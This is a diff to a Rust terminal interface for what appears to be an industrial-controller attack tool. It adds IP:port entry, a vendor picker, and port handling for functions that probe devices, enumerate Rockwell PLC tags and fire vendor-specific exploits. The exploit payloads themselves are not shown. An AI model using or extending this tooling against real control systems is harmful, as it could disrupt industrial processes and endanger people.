@@ -2460,25 +2539,43 @@ fn handle_ip_input(app: &mut App, code: KeyCode) {
     match code {
         KeyCode::Esc => { app.mode = Mode::Normal; app.input_buf.clear(); }
         KeyCode::Enter => {
-            let ip = app.input_buf.trim().to_string();
+            let raw = app.input_buf.trim().to_string();
+            // Accept "ip" or "ip:port"
+            let (ip, port_opt) = if let Some((addr, port_s)) = raw.split_once(':') {
+                (addr.to_string(), port_s.trim().parse::<u16>().ok())
+            } else {
+                (raw.clone(), None)
+            };
             if ip.parse::<std::net::Ipv4Addr>().is_ok() {
                 if app.active_jobs == 0 {
                     app.output_lines.clear();
                     app.output_scroll = 0;
                 }
-                app.output_lines.push(format!("══ Probe @ {ip} ══"));
-                app.active_jobs += 1;
-                app.log(format!("[*] Probing {ip}..."));
-                let tx = app.scan_tx.clone();
-                spawn_ip_scan(ip, tx);
-                app.mode = Mode::Normal;
-                app.input_buf.clear();
-            } else if !ip.is_empty() {
+                if let Some(port) = port_opt {
+                    // Manual add: store device with specified port, skip auto-detect
+                    use crate::db::Database;
+                    let fields = serde_json::json!({"port": port});
+                    if let Ok(db) = Database::open(&Database::default_path()) {
+                        let _ = db.upsert_device(&ip, "unknown", &fields);
+                    }
+                    app.log(format!("[+] Added {ip}:{port} — press [E] then [V] to pick protocol"));
+                    app.mode = Mode::Normal;
+                    app.input_buf.clear();
+                } else {
+                    app.output_lines.push(format!("══ Probe @ {ip} ══"));
+                    app.active_jobs += 1;
+                    app.log(format!("[*] Probing {ip}..."));
+                    let tx = app.scan_tx.clone();
+                    spawn_ip_scan(ip, tx);
+                    app.mode = Mode::Normal;
+                    app.input_buf.clear();
+                }
+            } else if !raw.is_empty() {
                 app.log(format!("[!] Invalid IPv4 address: {ip}"));
             }
         }
         KeyCode::Backspace => { app.input_buf.pop(); }
-        KeyCode::Char(c) if app.input_buf.len() < 15 => app.input_buf.push(c),
+        KeyCode::Char(c) if app.input_buf.len() < 21 => app.input_buf.push(c),
         _ => {}
     }
 }
@@ -2520,6 +2617,13 @@ fn handle_exploit_menu(app: &mut App, code: KeyCode) {
         KeyCode::PageUp => { app.scroll_output_up(10); }
         KeyCode::PageDown => { app.scroll_output_down(10); }
         KeyCode::Char('o') | KeyCode::Char('O') => app.enter_zoom(),
+        KeyCode::Char('v') | KeyCode::Char('V') => {
+            let active = app.selected_vendor().unwrap_or_default();
+            app.vendor_pick_sel = ALL_VENDORS.iter()
+                .position(|&v| v == active.as_str())
+                .unwrap_or(0);
+            app.mode = Mode::VendorPicker;
+        }
         KeyCode::Char('j') | KeyCode::Down => {
             app.exploit_sel = (app.exploit_sel + 1).min(app.exploit_defs.len().saturating_sub(1));
         }
@@ -2587,6 +2691,46 @@ fn handle_search(app: &mut App, code: KeyCode) {
     }
 }
 
+fn handle_vendor_picker(app: &mut App, code: KeyCode) {
+    match code {
+        KeyCode::Esc => app.mode = Mode::ExploitMenu,
+        KeyCode::Char('j') | KeyCode::Down => {
+            app.vendor_pick_sel = (app.vendor_pick_sel + 1).min(ALL_VENDORS.len() - 1);
+        }
+        KeyCode::Char('k') | KeyCode::Up => {
+            app.vendor_pick_sel = app.vendor_pick_sel.saturating_sub(1);
+        }
+        KeyCode::Enter => {
+            let vendor = ALL_VENDORS[app.vendor_pick_sel].to_string();
+            app.vendor_override = Some(vendor.clone());
+            app.exploit_defs = exploits_for(&vendor);
+            app.exploit_sel = 0;
+            app.mode = Mode::ExploitMenu;
+        }
+        _ => {}
+    }
+}
+
+fn draw_vendor_picker(frame: &mut Frame, area: Rect, app: &App) {
+    let popup = centered_rect(40, 75, area);
+    frame.render_widget(Clear, popup);
+    let items: Vec<ListItem> = ALL_VENDORS.iter().map(|&v| {
+        ListItem::new(Line::from(Span::styled(
+            format!("  {}  ", v.to_uppercase()),
+            Style::default().fg(vendor_color(v)),
+        )))
+    }).collect();
+    let mut state = ListState::default();
+    state.select(Some(app.vendor_pick_sel));
+    let list = List::new(items)
+        .block(Block::default().title(" View as Protocol \u{2014} [J/K] Navigate  [ENTER] Apply  [ESC] Cancel ")
+            .borders(Borders::ALL)
+            .border_style(Style::default().fg(Color::Magenta)))
+        .highlight_style(Style::default().bg(Color::DarkGray).add_modifier(Modifier::BOLD))
+        .highlight_symbol("\u{25b6} ");
+    frame.render_stateful_widget(list, popup, &mut state);
+}
+
 /// Load saved tags from DB into the output panel (synchronous).
 /// Returns true if any tags were found.
 fn load_db_tags_to_output(ip: &str, lines: &mut Vec<String>) -> bool {
@@ -2649,7 +2793,7 @@ fn maybe_auto_load_tags(app: &mut App) {
 fn background_tag_check(ip: String, tx: mpsc::Sender<ScanEvent>) {
     use crate::vendors::rockwell::driver;
     let out = |msg: &str| { let _ = tx.send(ScanEvent::Output(msg.to_string())); };
-    match driver::enumerate_tags(&ip) {
+    match driver::enumerate_tags(&ip, 0) {
         Ok(tags) => save_tags_and_diff(&ip, &tags, &out),
         Err(e)   => out(&format!("[-] Live tag check failed: {e}")),
     }
@@ -2681,14 +2825,16 @@ fn fire_exploit(app: &mut App, input: &str) {
             let tx = app.scan_tx.clone();
             let ip2 = ip.clone();
             let label2 = label.to_string();
+            let port = app.device_port(0);
             std::thread::spawn(move || {
                 let tx2 = tx.clone();
                 let out = move |msg: &str| { let _ = tx2.send(ScanEvent::Output(msg.to_string())); };
-                exploit_rockwell_monitor(&ip2, &out, stop);
+                exploit_rockwell_monitor(&ip2, port, &out, stop);
                 let _ = tx.send(ScanEvent::Done(format!("{label2} @ {ip2}")));
             });
         } else {
-            run_exploit_for(&vendor, app.exploit_sel, &ip, input, label, app.scan_tx.clone());
+            let port = app.device_port(0);
+            run_exploit_for(&vendor, app.exploit_sel, &ip, port, input, label, app.scan_tx.clone());
         }
     }
 }
